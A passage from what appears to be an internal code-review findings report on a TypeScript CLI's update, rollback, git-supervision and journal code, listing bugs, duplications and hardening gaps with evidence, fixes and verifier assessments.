**Problem.** decodeCanonicalJson already rejects any byte that is not canonical, and it throws a plain Error ("invalid canonical JSON: ..."). The `refuseBundle("bundle_not_canonical")` branch therefore never runs, and BundleJournalFile.load passes the plain Error through unwrapped, as it does for validator failures. The class comment (line 251) says that a write torn by death is a third state (exit 6). In practice a torn journal raises a generic Error. In apply.ts construct() (line 199-202) that compensation error is swallowed as 'any other compensation failure', where a LifecycleRecoveryRequiredError would propagate. The coordinator's own journal read (coordinator.ts:91-95) wraps the same failure into exit 6, so the two stores disagree. The redundant re-encode also doubles canonical-encoding cost on every journal load and plan open; NEW-53 measured that encoding as the dominant cost.

**Evidence.**

```
bundle-source.ts:211-214:
  decodeExact(bytes: Uint8Array, maximumBytes: number, path: string): unknown {
    const value = decodeCanonicalJson(bytes, maximumBytes);
    if (Buffer.compare(encoder.encode(encodeCanonicalJson(value)), bytes) !== 0) refuseBundle("bundle_not_canonical", path);

canonical-json.ts:326: `if (Buffer.compare(canonicalBytes, bytes) !== 0) fail("input is not byte-for-byte canonical");` with fail = `throw new Error(...)`.
Node probe against packages/core/dist: decodeCanonicalJson('{"b":1,"a":2}\n') -> Error, instanceof LifecycleRecoveryRequiredError=false; torn '{"a":1}\n{"a"' -> Error, false.
The same dead pattern is at construction.ts:186-189 (update_construction_not_canonical). bootstrap/journal-store.ts:282 already documents that the recheck is redundant (NEW-53).
```

**Fix.** Replace the body with a try/catch: `try { return decodeCanonicalJson(bytes, maximumBytes); } catch { return refuseBundle("bundle_not_canonical", path); }`. Wrap `validate(...)` in BundleJournalFile.load the same way, letting LifecycleRecoveryRequiredError, TypeError and RangeError pass through, as retainedEvidence in apply-ports.ts does. Apply the same change to construction.ts decodeExact.

**Validation.** In bundle-source.test.ts, truncate a staged bundle_source_staging journal mid-write, then call BundleSourceExecutor.compensate. Expect a rejection with LifecycleRecoveryRequiredError (bundle_not_canonical). It currently fails with a plain Error.

**Verifier (downgraded).** Confirmed. decodeCanonicalJson (packages/core/src/lifecycle/canonical-json.ts:326) already fails with `invalid canonical JSON: input is not byte-for-byte canonical` and throws a plain Error from fail(). That makes the re-encode compare at bundle-source.ts:213 (and at construction.ts:188) unreachable, and no test references bundle_not_canonical or update_construction_not_canonical. BundleJournalFile.write rewrites in place, so a death mid-write can leave torn bytes. load() then raises a plain Error, which contradicts the class comment at line 251 ('a write torn by death is a third state (exit 6)'). In apply.ts construct() that error is swallowed as a non-third-state compensation failure. coordinator.ts:91-95 maps the same failure to LifecycleRecoveryRequiredError. I downgraded it because both paths still fail closed and nothing is lost or corrupted; the impact is the exit-code classification during crash recovery plus one redundant encode per load. NEW-53 covers the same pattern only in bootstrap/journal-store.ts, not these update-path copies.

### W2-PORTS-3 · inconsistency · Source executors built by recoverySources use the wall clock instead of context.now()

`apps/cli/src/update/apply-ports.ts:899`

**Problem.** The bundle and rollback source executors stamp their journals with stampAfter(now, ...). recoverySources gives them `new Date()`. Every other participant in this file uses context.now(), including the same executors in compactStaging at line 799 and the construction store at line 1146. Source staging journals therefore ignore the injected clock: a test or replay with a fixed clock gets real timestamps in bundle and rollback source journals, but injected ones everywhere else.

**Evidence.**

```
apply-ports.ts:899: `const deps = { fs: lifecycle.fs, effectiveUid: lifecycle.effectiveUid, now: () => new Date() };`
apply-ports.ts:799: `const deps = { fs: lifecycle.fs, effectiveUid: lifecycle.effectiveUid, now: () => context.now() };`
```

**Fix.** Pass `context` (or a `now` function) into recoverySources and use `() => context.now()`. Both call sites (lines 816 and 1146) already have the context.

**Validation.** Stage a bundle source through productionUpdateApplyPorts with context.now fixed at 2030-01-01T00:00:00Z, then assert the journal's updatedAt equals the injected time.

**Verifier (confirmed).** Line 899 reads verbatim `now: () => new Date()`, line 799 reads `now: () => context.now()`, and line 1146 passes context.now to the store, while recoverySources receives no context. construction(id) at line 1146 calls recoverySources on the forward and rollback apply paths. So the bundle and rollback source executors stamp journals with the wall clock, while every sibling participant uses the injected clock. This is a minor inconsistency in test and replay determinism.

### W2-PORTS-4 · duplication · verifierPort re-implements retainedBundleManifest and classifies errors differently

`apps/cli/src/update/apply-ports.ts:768`

**Problem.** Both functions build the same `state/release-metadata/bundles/<hash>.json` path, read it with a 16_777_216 literal, compare the hash, and validate the manifest. retainedBundleManifest wraps validator failures into exit 6 through retainedEvidence; verifierPort lets the plain Error escape. The path literal also appears in retirement-resolve.ts:38. The size literal duplicates planning.ts MAXIMUM_BUNDLE_MANIFEST_BYTES and the launcher's MAX_BUNDLE_MANIFEST_BYTES.

**Evidence.**

```
apply-ports.ts:768-771:
  const manifestPath = parseCanonicalAbsolutePathText(`${lifecycle.roots.productHome}/state/release-metadata/bundles/${plan.release.bundleManifestHash}.json`);
  const bytes = await readBound(lifecycle, manifestPath, 16_777_216) ?? thirdState(...);
  if (sha256(bytes) !== plan.release.bundleManifestHash) thirdState(...);
  const bundleManifest = validateBundleManifest(decodeCanonicalJson(bytes, 16_777_216));
apply-ports.ts:988-991: identical, except the last line is `return retainedEvidence(at, () => validateBundleManifest(decodeCanonicalJson(bytes, 16_777_216)));`
```

**Fix.** In verifierPort, call `await retainedBundleManifest(lifecycle, plan.release)`; it takes a ReleaseIdentityV1, and plan.release carries bundleManifestHash. Hoist the 16 MiB bound into one named constant.

**Validation.** Typecheck, plus the existing verifier tests in apply-ports.test.ts. Add one case where a corrupt retained manifest yields LifecycleRecoveryRequiredError on the verifier path.

**Verifier (confirmed).** Lines 768-771 and 988-991 are near-identical: the same path template, 16_777_216 literal, hash check and validateBundleManifest(decodeCanonicalJson(...)). Only retainedBundleManifest wraps the result in retainedEvidence. The error-classification difference is practically unreachable, because the bytes have already matched the plan-pinned bundleManifestHash. A caveat for the fix: calling retainedBundleManifest from the verifier would change the reason code from update_verifier_bundle_manifest to update_rollback_bundle_manifest, so the shared helper should take the reason as a parameter. This finding is only a duplication cleanup.

### W2-PORTS-5 · duplication · allocate filters ledger ids with its own regex instead of the allocatedIdsFrom/allocatedCounterOf filter used in three other files

`apps/cli/src/update/apply-ports.ts:1118`

**Problem.** mutation-gate.ts:210, uninstall.ts:1797 and git/service.ts:889 each copy allocatedIdsFrom, which filters with core's allocatedCounterOf. allocate adds a fourth variant with a looser hand-written regex: any two-letter prefix, non-canonical decimals such as `007`, and no UINT64 bound. An id that passes this regex but fails the core grammar reaches reserveLifecycleIdBlock and is refused there as lifecycle_allocated_id_grammar (exit 6). The other three sites drop the same id silently. Ledger ids are pre-parsed, so this rarely matters in practice, but the four copies have already drifted.

**Evidence.**

```
apply-ports.ts:1118-1119: `const allocatedIds = [...snapshot.coordinators.map((record) => record.id as string), ...[...snapshot.foundation.journals.keys()].map(String)];` then `allocatedIds.filter((allocated) => /^[a-z]{2}_[0-9a-f]{64}_[0-9]+$/u.test(allocated))`.
core ids.ts:53: `ALLOCATED = new RegExp(`^(${PREFIXES.join("|")})_([0-9a-f]{64})_(${CANONICAL_DECIMAL})$`)`.
```

**Fix.** Export allocatedIdsFrom from lifecycle/mutation-gate.ts (or move it to core next to allocatedCounterOf). Use it here and in uninstall.ts and git/service.ts, and delete the regex.

**Validation.** `grep -rn "function allocatedIdsFrom" apps/cli/src` returns one definition. The existing allocate and uninstall tests stay green.

**Verifier (confirmed).** Line 1119 filters with the hand-written regex `/^[a-z]{2}_[0-9a-f]{64}_[0-9]+$/u`. mutation-gate.ts:210, uninstall.ts:1797 and git/service.ts:889 each define their own allocatedIdsFrom using allocatedCounterOf, whose grammar is core ids.ts:52-53 (known prefixes, CANONICAL_DECIMAL). That makes four copies, and they have drifted. The behavioral divergence is effectively unreachable because ledger ids are parsed upstream. This is duplication only, and no wave-1 entry covers it.

### W2-PORTS-6 · duplication · Local sha256 helper and five inline parent-path slices duplicate the helpers bundle-source.ts already exports

`apps/cli/src/update/apply-ports.ts:168` · related: CORE-UPD-1

**Problem.** apply-ports.ts imports from bundle-source.ts but still defines its own sha256, identical to the exported sha256Hex. It also open-codes `path.slice(0, path.lastIndexOf("/"))` and then lstat + syncDirectory five times, where bundle-source.ts exports parentPath. The same sha256 body exists seven times under apps/cli/src/update (apply-ports, bundle-source, construction, compose, planning, state-participant, packaged-release).

**Evidence.**

```
apply-ports.ts:168-170 `function sha256(bytes: Uint8Array): LowerHexSha256 { return createHash("sha256").update(bytes).digest("hex") as LowerHexSha256; }`; bundle-source.ts:88-90 has the identical body exported as sha256Hex. Inline parent slicing in apply-ports.ts at lines 668, 694, 849, 1216 and 1233, e.g. `parseCanonicalAbsolutePathText(plan.path.slice(0, plan.path.lastIndexOf("/")))`; bundle-source.ts:92 exports `parentPath`.
```

**Fix.** Import sha256Hex and parentPath from ./bundle-source.js, or move both to a small update/hash-path module that the seven files share. Extract one `unlinkAndSyncParent(lifecycle, entry)` for releaseEmptyReservation, guardedUnlink, releaseExecutorReservation and removeEmptyDirectory.

**Validation.** Typecheck and lint pass. `grep -c 'createHash("sha256").update(bytes).digest("hex")' apps/cli/src/update/*.ts` drops to 1.

**Verifier (confirmed).** apps/cli/src/update/apply-ports.ts:168-170 is byte-identical to the exported sha256Hex in bundle-source.ts:88-90, and apply-ports already imports from ./bundle-source.js (line 118). The inline parent slice `x.slice(0, x.lastIndexOf("/"))` appears at lines 668, 694, 849, 1216 and 1233 and duplicates the exported parentPath (bundle-source.ts:92). The grep confirms that the plain sha256 body appears in the 7 claimed production files (packaged-release.ts has 3). This is not a duplicate of CORE-UPD-1, which covers the domain-separated no-LF hash. The cost of these copies is small.

### W2-PORTS-7 · security · codexPlanningState reads the manifest and registration record with plain readFile: symlinks followed, no size bound before the read, manifest not validated

`apps/cli/src/update/apply-ports.ts:260`

**Problem.** Everywhere else this file reads home state through guarded lstat plus readRegular with a byte cap (readBound). codexPlanningState uses node readFile on context.paths.manifestFile and on the Codex registration file. readFile follows symlinks and reads the whole file before any cap applies; the registration size check runs only after the full read. The manifest is cast to InstallationManifestV2 without validateManifestV2, and its artifacts drive the plugin-tree hash that decides the registration state. The manifest read is also a second, unguarded read of a file that admission had already checked, so it can see different bytes (time-of-check to time-of-use).

**Evidence.**

```
apply-ports.ts:260-261:
  const manifestBytes = await readFile(context.paths.manifestFile);
  const manifest = decodeCanonicalJson(manifestBytes, MAX_MANIFEST_BYTES) as unknown as InstallationManifestV2;
apply-ports.ts:268-269:
  const bytes = await readFile(registrationFile);
  record = bytes.byteLength > MAX_REGISTRATION_BYTES ? null : validateCodexRegistrationRecord(bytes);
```

**Fix.** Read the manifest with readBound(lifecycle, manifestFile, MAX_MANIFEST_BYTES) and validate it with validateManifestV2(..., gateManifestAdmission(context)), or take the already-admitted manifest from UpdateHomeV1. For the registration file, lstat first and skip the read when size > MAX_REGISTRATION_BYTES or the entry is not a regular file.

**Validation.** Unit test: replace manifest.json with a symlink to a valid manifest elsewhere. updateCodexPort must refuse instead of reading through the link. A registration file of 100 MiB must report unregistered without being fully read.

**Verifier (confirmed).** Lines 260-261 and 268-269 match the finding verbatim. Both reads use node readFile, which follows symlinks and has no lstat or size gate before the read. The manifest is cast to InstallationManifestV2 without validateManifestV2, while the rest of the file reads through readBound/guarded lstat. Admission validated the manifest earlier, so this is a second, unguarded read open to a time-of-check to time-of-use race. A malformed manifest here would surface as a TypeError rather than a refusal. Exploiting it needs a same-uid writer to the product home or to ~/.codex, and the result only feeds planning-time registration state. It is an inconsistency and hardening gap, not a privilege boundary, so low severity is correct.

### W2-ROLLBACK-2 · logic · Retained rollback path never recomputes the rollback binding and re-implements only part of validateRollbackBindingGraph

`packages/core/src/update/rollback.ts:330`

**Problem.** rollbackBindingHash is defined as a pure function of (executionBindingHash, payloadId, installed and previous release-identity hashes). The only place that recomputes it is validateRollbackBindingGraph, which runs only inside buildRollbackPayload at apply time. validateRollbackRecord parses the record's rollbackBindingHash as an opaque hash. The CLI's readRollbackEvidence then checks only that inverse plan, inventory and leaves carry the same value as the record. It also skips the graph's other invariants: canonical owner order, migration chain order (which compose relies on to pair leaves with inventory rows by position, rollback.ts:715), and the blob-entry bijection by role. The persisted record is therefore validated under weaker conditions than it was built under.

**Evidence.**

```
rollback.ts:330 `rollbackBindingHash: parseLowerHexSha256(input.rollbackBindingHash),` with no recomputation in validateRollbackRecord (318-336). Searching apps for `rollbackBindingHash(` finds no CLI call. context.ts:453 `plan.rollbackBindingHash !== record.rollbackBindingHash` is an equality check only. context.test.ts:158 `const binding = sha256("synthetic rollback binding");` and the test at :233 expects readRollbackEvidence to accept that payload.
```

**Fix.** In validateRollbackRecord, recompute rollbackBindingHash({ executionBindingHash, payloadId, installed.releaseIdentityHash, previous.releaseIdentityHash }) and fail on mismatch. In readRollbackEvidence, assemble a PreparedRollbackPayloadV1 from the retained bytes (identity as compose.ts:1070 builds it, the record bytes, inverse-plan and inventory bytes, and the leaves) and call validateRollbackBindingGraph instead of the hand-written subset.

**Validation.** Add a core test where validateRollbackRecord rejects a record whose binding differs from the recomputed one. Add CLI context tests where readRollbackEvidence refuses with exit 6 for a synthetic binding, out-of-order owner leaves, and a blob whose inventory role differs. Then update the fixtures to use real bindings.

**Verifier (downgraded).** The facts hold. validateRollbackRecord (rollback.ts:318-336) parses rollbackBindingHash without recomputing it, and readRollbackEvidence (context.ts:451-485) checks a subset of validateRollbackBindingGraph: equality of the binding and IDs, plus the leaf retainedHash under record.rollbackBindingHash. It does not recompute the binding, check owner or chain order, or check the blob-role bijection. Impact is overstated. Every retained byte is hash-chained from the record: inversePlanHash, payloadInventoryHash, entry sha256 and the ref retainedHash. buildRollbackPayload ran the full graph validation on those exact bytes before persisting (rollback.ts:663). Reaching an inconsistent state therefore needs a consistent rewrite of the whole chain, and recomputation would not stop that because the binding is an unkeyed hash of record fields. The positional pairing claim is also wrong for the rollback path: #retainedMigrationRows (compose.ts:920) pairs by a `${migration.id}\0${target}` map key, not by position. This is a defense-in-depth gap only.

### W2-ROLLBACK-4 · logic · Forward `*_created`/`metadata_published` steps have no phase guard and are accepted during compensation

`packages/core/src/update/rollback.ts:1626`

**Problem.** Both advance functions are documented as "The single legal successor ...; throws on any phase/cursor leap". Yet structure_created, metadata_created, ready_created (source) and structure_created, metadata_published (publication) check only the write state, not the phase. If a create_intent is still pending after `compensate` (bindIntents found no path), a later created step is accepted in a compensating_* phase. It raises the created top above the compensation cursor, and the validators accept the result. Compensation then reaches rolled_back without removing the newly recorded directory or file. The current executors never issue such a step, so this is latent, but the state machine does not enforce what it promises.

**Evidence.**

```
rollback.ts:1626-1628 `case "structure_created": need(current.structureWriteState?.state === "create_intent");` (no phase check). The same pattern appears at 1643-1645 (metadata_published), 1203-1205, 1220-1222 and 1236-1238. Compare 1640 `need(current.phase === "metadata_publishing" && ...)` for metadata_intent. The compensating_* validator cases (1583-1591, 1144-1154) do not constrain the write state against the cursors.
```

**Fix.** Add a phase guard to each created step: `isRollbackPayloadPublicationForward(current.phase)` and `isRollbackPayloadSourceForward(current.phase)` respectively, so all binding happens before `compensate`. That is already the order the CLI uses (rollback-publication.ts:388-390, rollback-source.ts:392-394).

**Validation.** Add core tests: from a compensating_metadata or compensating journal that still holds a create_intent, advancing with structure_created, metadata_published or metadata_created throws. The existing CLI recovery tests must stay green.

**Verifier (confirmed).** Verified. structure_created (1202-1205, 1626-1628), metadata_created (1219-1222), ready_created (1235-1238) and metadata_published (1643-1645) check only the write state. Their sibling intent steps and the entry steps (advanceEntry plus need(phase === entries_publishing/payload_staging)) check the phase. The validators bound the compensation cursor only by '<= createdTop/entryTop', so a create recorded after compensate raises the top above the cursor and still validates, and that object is never compensated. The finding correctly calls this latent: the CLI binds intents before compensate (rollback-publication.ts:354-390), so no current executor issues the step. Low severity.

### W2-ROLLBACK-5 · inconsistency · Publication journal reaches rolled_back with stale write states; the source journal clears them

`packages/core/src/update/rollback.ts:1682`

**Problem.** The source journal's terminal compensation step clears entryWriteState, structureWriteState and metadataWriteState. The publication journal's terminal step keeps whatever in-flight write state existed, and its rolled_back validator does not constrain write states. Two sibling participants therefore persist different shapes for the same terminal state. A reader of a rolled_back publication journal can still see, for example, an `entry_created` or `published` microstate for a path that compensation already removed.

**Evidence.**

```
rollback.ts:1270 `... : { ...base, phase: "rolled_back", entryWriteState: null, structureWriteState: null, metadataWriteState: null };` versus rollback.ts:1682 `next = at >= 0 ? { ...base, compensationStructureNext: at - 1 } : { ...base, phase: "rolled_back" };`. Validator at 1592-1593 checks only the compensation cursors.
```

**Fix.** In the publication `compensation_step` terminal branch, also set entryWriteState, structureWriteState and metadataWriteState to null. Have both validators require null write states in rolled_back.

**Validation.** Add a core test: compensate a publication journal from an in-flight entry_created and metadata `published` state to rolled_back, and assert that all write states are null and that a rolled_back journal carrying a write state fails validation.

**Verifier (confirmed).** Verified. The source terminal branch at rollback.ts:1270 nulls all three write states. The publication terminal branches (1682 and the publish===null compensate at 1660) leave them as they were, and the rolled_back validator (1592-1593) does not constrain them. Impact is cosmetic. rolled_back is terminal, publication compaction starts only from 'finalized' (1691), and publish() refuses a non-forward phase before its in-flight check (rollback-publication.ts:211-212). No reader acts on a stale write state in rolled_back. The inconsistency between the two sibling journals is real but low.

### W2-SEC-GIT-1 · inconsistency · Supervisor ignores edge `when` predicates and minUses; orderAfter uses `some` instead of every non-vacuous predecessor

`packages/security/src/git/supervisor.ts:363`

**Problem.** Spec §4.2 (opt-in-surfaces design, lines 3017-3027) says an edge whose `when` predicate is false has zero permits, an edge whose predicate is true must stay within minUses..maxUses, and `direct_source_push` must order after both `direct_distribution_probe` and `direct_source_build` (the second is vacuous only when `new_commit` is false). The supervisor never evaluates `when` and never checks minUses. It accepts any one orderAfter predecessor. So the closed graph the table hashes is enforced only on maxUses and coarse ordering. Example: with a new-commit plan, `direct_source_push` is admitted after the probe alone, with zero or one source-build use (minUses is 2). An edge whose predicate is false (for example ssh or https edges during a local push) is also not refused by the supervisor. Today only the CLI runtime's candidate checks and local-receive's exact node list stand in for these rules.

**Evidence.**

```
supervisor.ts:357-363:
    const uses = this.#consumedUses.get(edge.id) ?? 0;
    if (uses >= edge.maxUses) refuse("git_edge_uses_exceeded");
    ...
    if (edge.orderAfter.length > 0 && !edge.orderAfter.some((id) => this.#consumedUses.has(id))) refuse("git_wrong_order");
`grep -rn "minUses" packages apps` (excluding tests and dist) finds only process-table.ts parsing and validation (lines 336, 352, 354, 364, 693, 697) and types.ts:261. `grep -rn "\.when\b"` finds only process-table.ts:361 (parsing). The predicate literals (new_commit, pack_required, local_pack_received, any_push) appear nowhere in push-plan.ts, runtime.ts or gateways.ts, so no code computes them.
```

**Fix.** Choose one of two options. (A) Pass the plan's active-predicate set into GitProcessSupervisor. Refuse to issue a permit for an edge whose predicate is false. Require every orderAfter edge whose predicate is true to have been consumed, instead of `some`. Add a phase-close check that every active edge reached minUses. (B) Amend spec §4.2 to say the CLI runtime and prepareLocalReceive's exact node list enforce `when`/minUses, and that the table carries them only as hashed metadata.

**Validation.** For (A), add a supervisor.test.ts case: a plan with new_commit active, a consumed probe, zero direct_source_build uses, then run(direct_source_push). It must refuse git_wrong_order (today it is admitted). Add a second case: an ssh edge issued during a local_push plan must refuse.

**Verifier (downgraded).** The code matches the finding: supervisor.ts:363 uses `orderAfter.some(...)`, and nothing in it evaluates `when` or minUses. Spec line 2921 does say the supervisor maintains the plan's transition graph and rejects wrong order. The gap cannot be reached in practice, though. Gateway permits come only from the runtime's plan-built `#pending` list (apps/cli/src/commands/git/runtime.ts:534-560), and an unplanned basename refuses `git_gateway_unplanned_process`, so an ssh or https edge is never issued during a local push. The coordinator's own root edges run in a fixed order: build, then push. Every gateway orderAfter list has one entry, so `some` equals `every` there. The only real divergence is the two-predecessor `direct_source_push` edge, where supervisor.test.ts's runPush (probe, then push) relies on `some` because the supervisor has no predicate input. This is spec-versus-implementation drift between trusted layers, not an exploitable path, so medium is overstated.

### W2-SEC-GIT-2 · logic · Quarantine-destroy failure in the refusal path replaces the original refusal

`packages/security/src/git/pack-reader.ts:975`

**Problem.** GuardedSha1PackReader.validate and prepareLocalReceive call destroyGitQuarantine inside their catch block. If that call throws (for example git_quarantine_changed, because the root's uid or type changed, or rm fails with EACCES or ENOTEMPTY), the new error propagates and the original refusal reason is lost. Examples of lost reasons: git_pack_extra_object, git_receive_ref_mismatch. Callers and the audit then see only the cleanup failure, which breaks the cause-chain rule. recheckAll (supervisor.ts:172) has the same pattern: a bare `catch { refuse(...) }` discards the underlying recheck error.

**Evidence.**

```
pack-reader.ts:972-977:
    try {
      return await this.#validate(request, budget);
    } catch (error) {
      await destroyGitQuarantine(request.quarantineRoot, request.effectiveUid);
      throw error;
    }
local-receive.ts:345-350 is identical. supervisor.ts:172-174:
  } catch {
    refuse("unsupported_git_distribution");
  }
```

**Fix.** Wrap the destroy call. On a destroy failure, throw a SecurityRefusalError that keeps the original error as `cause`, or rethrow the original error and attach the destroy failure as its cause. In recheckAll, pass the caught error as `cause` (SecurityRefusalError would need to accept options).

**Validation.** Unit test: make destroyGitQuarantine fail by giving the quarantine root a foreign or changed type after a pack refusal. Assert that the thrown error, or its cause, still carries the original reason, for example git_pack_checksum_mismatch.

**Verifier (confirmed).** Verified verbatim: pack-reader.ts:972-977 and local-receive.ts:345-350 call `await destroyGitQuarantine(...)` inside catch with no guard. destroyGitQuarantine (pack-reader.ts:245-255) can throw `git_quarantine_changed`, a non-ENOENT lstat error, or an rm error, and that error replaces the original refusal reason. It is rare, because it needs a uid or type change or an rm failure on the quarantine. Still, it is a real loss of the cause chain, the same class as the dropped-cause bug NEW-138 fixed. The recheckAll half matters little because the refusal code stays the same either way. No known.json or BACKLOG entry covers it.

### W2-SEC-GIT-3 · duplication · EDGE_PHASE_BUDGET map and object-count ceiling are copied instead of shared

`packages/security/src/git/supervisor.ts:53`

**Problem.** The phase-to-budget map that decides which permits share the push deadline is declared twice: once to validate the table and once to issue permits. The object-count ceiling 200001 is also defined twice, as core GIT_OBJECT_COUNT_MAX and security GIT_PACK_OBJECT_COUNT_MAX. If one copy is edited without the other, table validation (phase-reset check) and permit issuance (git_phase_mismatch) disagree. Likewise gitPackReaderBudget's own cap and validateGitPackReaderBudget's cap would differ.

**Evidence.**

```
supervisor.ts:53-60 and process-table.ts:270-277 both contain:
  distribution_probe: "distribution_probe", config_candidate: "config_candidate", source_build: "source_build", push_pack: "push", push_transport: "push", destination_receive: "push",
process-table.ts:55 `export const GIT_PACK_OBJECT_COUNT_MAX = 200001;` and packages/core/src/git/types.ts:222 `export const GIT_OBJECT_COUNT_MAX = 200001;`
```

**Fix.** Export EDGE_PHASE_BUDGET from process-table.ts and import it in supervisor.ts. Define GIT_PACK_OBJECT_COUNT_MAX as `GIT_OBJECT_COUNT_MAX` imported from @developer-os/core (security already depends on core).

**Validation.** Run typecheck and the supervisor/process-table/pack-reader tests unchanged. `grep -n "push_transport: \"push\"" packages/security/src/git/*.ts` should return one line.

**Verifier (confirmed).** Verified: supervisor.ts:53-60 and process-table.ts:270-277 declare the same EDGE_PHASE_BUDGET literal. process-table.ts:55 `GIT_PACK_OBJECT_COUNT_MAX = 200001` duplicates core types.ts:222 `GIT_OBJECT_COUNT_MAX = 200001`. security depends on @developer-os/core (package.json:17), so sharing the constant is possible. Neither map is hashed into the table, so a one-sided edit would cause silent drift. It is maintenance duplication only, with no current bug.

### W2-SEC-GIT-4 · dead-code · Admitted-count and closure-count checks can never fire

`packages/security/src/git/pack-reader.ts:1006` · removal confidence: low

**Problem.** validateGitPackReaderBudget forces packHeaderObjectCount == admittedObjectCount == closedEffectObjectCount, and line 1003 already proves count == packHeaderObjectCount. frame() inserts `count` distinct offsets. resolveDeltas either admits every non-base entry or refuses, and #admit refuses duplicates, so #objects.size == count whenever control reaches line 1006. closure() adds only pack objects and refuses any pack object it does not add, so closure.size == #objects.size at line 1028. Neither refusal is reachable. They read like independent proofs but add nothing beyond the earlier checks.

**Evidence.**

```
pack-reader.ts:1003 `if (count !== budget.packHeaderObjectCount) refuse("git_pack_count_mismatch");`
1006 `if (validation.admittedCount !== budget.admittedObjectCount) refuse("git_pack_count_mismatch");`
1028 `if (closure.size !== budget.closedEffectObjectCount) refuse("git_pack_count_mismatch");`
packages/core/src/git/types.ts:335 `if (packHeaderObjectCount !== closedEffectObjectCount || closedEffectObjectCount !== admittedObjectCount) fail(...)`. pack-reader.test.ts has no test that reaches 1006 or 1028 with unequal counts; the 'unequal' test at line 354 refuses earlier, with git_pack_budget_invalid.
```

**Fix.** Either remove lines 1006 and 1028, or keep them and add a one-line comment saying they mirror spec §4.2's three-count proof as defense in depth. They are low-risk to keep.

**Validation.** Typecheck. pack-reader.test.ts stays green after removal, because no test reaches these lines.

**Verifier (confirmed).** Traced the code. frame() keys #entries by strictly increasing offsets, which gives `count` distinct entries. Each entry is admitted once, and a second admission refuses `git_pack_duplicate_object`. resolveDeltas either resolves every pending entry or refuses `git_pack_missing_base`. So whenever line 1006 is reached, #objects.size == count == packHeaderObjectCount == admittedObjectCount, which validateGitPackReaderBudget forces equal. closure() adds only oids that are in #objects (a boundary-only oid hits `continue` and is not added), and it refuses any #objects oid it does not add, so closure.size == #objects.size at line 1028. Both refusals are unreachable. The impact is negligible and keeping them as defense in depth is defensible, so removal_confidence low is right.

### W2-SEC-UPD-2 · security · Sampler fails open: a ps error returns null, which both supervisors treat as 'process gone' and stop sampling

`packages/security/src/update/planner-process.ts:373`

**Problem.** sampleNodePlannerProcess returns null when `/bin/ps` fails (execFile error, EAGAIN at the process limit, or maxBuffer). It also returns null when the pid row is missing. Both supervisors read null as 'already gone' and return without rescheduling, so the RSS and descendant bounds go unenforced for the rest of the run. A planner or verifier that forks until the user's process limit makes the very `ps` fork that should catch it fail. One transient failure is enough to disable the bound silently.

**Evidence.**

```
planner-process.ts:373-376 `if (error !== null) { resolveSample(null); return; }`. planner-process.ts:196-197 `this.dependencies.sample(child.pid).then((observed) => { if (observed === null || !running) return;` and verifier-process.ts:168-169 `sample(child.pid).then((observed) => { if (observed === null || !state.running) return;`. The interface doc at planner-process.ts:66 says '`null` when the process is already gone', but the production sampler also returns null on failure.
```

**Fix.** Make sampler failure distinct from absence: reject (or throw) on execFile error so the supervisors' existing rejection handler (`supervision.fail(error)` / `fail`) kills and refuses. Keep null only for 'pid not in the snapshot'.

**Validation.** Unit test: inject `sample` that rejects once. Expect run() to refuse with a SecurityRefusalError and child.kill called. Production check: stub execFile to error and assert sampleNodePlannerProcess rejects.

**Verifier (downgraded).** Confirmed. planner-process.ts:373-376 resolves null on any execFile error. Both supervisors then return without rescheduling (planner-process.ts:197, verifier-process.ts:169), even though the interface doc at line 66 defines null only as 'already gone'. Production wires this sampler at apply-ports.ts:763 and context.ts:580. Downgraded to low: the ponytail comment at lines 366-368 declares the sampler a secondary, polled control and the capability graph gate the primary one. The wall and idle deadlines still kill the process group. The planner is code from the signed, verified target bundle, so reaching this needs a buggy or malicious signed release.

### W2-SEC-UPD-3 · logic · After a kill, supervisors wait for pipe EOF and 'close' with no deadline, so an escaped descendant holding stdout hangs the CLI

`packages/security/src/update/planner-process.ts:221`

**Problem.** fail() only calls child.kill(), which signals the child's process group. readOutput/drainStderr then keep iterating child.stdout/stderr, and `await child.exited` waits on 'close', which Node emits only after every stdio pipe closes. A descendant in another session (e.g. `spawn(..., {detached:true, stdio:'inherit'})`, reparented after the planner exits) keeps the pipe open. The kill does not reach it, the timers have already fired once (fail is idempotent), and the supervisor never destroys its streams, so the wait has no bound. The 1 s polled sampler can miss a descendant once the planner exits and it is reparented to launchd.

**Evidence.**

```
planner-process.ts:216-221 `[, result] = await Promise.all([guard(writeInput(...)), guard(readOutput(...)), guard(drainStderr(...))]); const exit = await child.exited;`. readOutput checks `supervision.failure` only when a chunk arrives (line 275). spawnNodePlannerChild resolves `exited` only on 'close' (326). Same shape in verifier-process.ts:221-222.
```

**Fix.** Have the production child's kill() also destroy stdin/stdout/stderr (`child.stdout.destroy()` etc.) once the group is signalled. Alternatively resolve `exited` on 'exit' and stop awaiting stream EOF once a failure is recorded.

**Validation.** Integration test with a fixture planner that spawns `sleep 60` detached with inherited stdout, then exits. Expect run() to refuse within idle and wall bounds instead of hanging for 60 s.

**Verifier (confirmed).** Confirmed. fail() only signals the process group (planner-process.ts:180, kill at 352-362). readOutput breaks only when a chunk arrives or at EOF (line 275). `exited` resolves only on 'close' (line 326), which waits for every stdio pipe. A descendant that calls setsid and holds stdout after the planner exits is outside the group, and the 1 s sampler returns null once the planner pid is gone (line 380). So run() waits until that descendant exits, whatever the deadlines say. verifier-process.ts:220-221 has the same shape. Low as stated: it needs a misbehaving signed planner or verifier, and the cost is a hang, not a bypass.

### W2-TX-A-1 · logic · Re-entry shape check requires updatedAt >= createdAt, which no journal writer enforces

`packages/core/src/transactions/executor.ts:1095`

**Problem.** exactBootstrapFoundationJournalShape refuses a journal whose updatedAt is earlier than its createdAt. Both writers stamp updatedAt with the raw dependencies.clock() and never check order: store.transition (store.ts:288-305 checks only isIsoDate) and transitionBootstrapFoundationInPlace (executor.ts:2987-2991). The predicate guards all three re-entry paths: the bootstrap restore (line 1172, which throws instead of treating the body as crash residue), the lifecycle resume branch (line 1847) and the update resume branch (line 1996). Suppose the wall clock steps backwards (an NTP step, a manual change, a VM resume) between the planned journal's createdAt and a later transition, and the process then dies. Every later executeBootstrap/Lifecycle/UpdateFoundationParticipant call refuses that legal journal with TransactionStateError, permanently. The ordinary resume(id) would accept the same journal. The validation rule does not match the persistence rule.

**Evidence.**

```
line 1092-1096: `return journal.id === expected.id &&
    journal.kind === expected.kind &&
    journal.createdAt === expected.createdAt &&
    Date.parse(journal.updatedAt) >= Date.parse(journal.createdAt) &&
